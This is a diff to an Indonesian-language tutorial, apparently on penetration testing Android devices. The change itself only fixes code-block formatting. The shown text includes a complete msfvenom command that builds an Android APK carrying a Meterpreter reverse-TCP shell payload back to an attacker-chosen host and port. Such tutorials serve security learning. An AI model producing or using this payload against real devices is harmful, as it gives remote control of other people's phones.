@@ -8,6 +8,6 @@ Saya akan mencoba membuat payload android dengan msfvenom dan menggunakannya di 
 
 Untuk membuat shellcode android dengan msfvenom kita dapat menggunakan payload */android/meterpreter/reverse_tcp* yang akan membuat sebuah file aplikasi yang berisi payload reverse shell menggunakan protokol tcp.
 
-'''bash
+```bash
 msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP_tujuan> LPORT=<PORT_tujuan> -o <hasil_output>
-'''
+```
